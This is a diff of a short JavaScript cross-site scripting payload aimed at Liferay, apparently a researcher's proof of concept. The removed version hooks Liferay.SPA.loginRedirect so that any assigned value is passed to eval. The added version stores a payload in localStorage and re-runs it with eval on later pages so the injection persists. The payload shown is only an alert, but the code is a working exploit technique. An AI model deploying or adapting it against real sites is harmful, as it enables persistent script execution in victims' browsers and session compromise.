@@ -1,17 +1,17 @@
-// Save the value of the injected redirect
-const payload = Liferay.SPA.loginRedirect;
+// Save actual payload for later pages
+localStorage.setItem('xss_payload', `alert("🔥 XSS triggered after login!")`);
 
-// Automatically execute any future assignment
-Object.defineProperty(Liferay.SPA, 'loginRedirect', {
-  set: function(v) {
-    eval(v); // ☠️ any future assignment gets executed
-  }
-});
-
-// Execute the one that's already present (which includes script injection)
-if (payload) {
-  eval(payload); // loads your own x.js again, yes
+// Optional: trigger the loader if present
+if (typeof Liferay !== 'undefined' && Liferay.SPA?.loginRedirect) {
+  try {
+    eval(Liferay.SPA.loginRedirect);
+  } catch (e) {}
 }
 
-// Your actual attack payload:
-alert("XSS from Vaibhav!");
+// Always check localStorage to re-trigger payload on new pages
+setTimeout(() => {
+  try {
+    const stored = localStorage.getItem('xss_payload');
+    if (stored) eval(stored);
+  } catch (e) {}
+}, 1000);
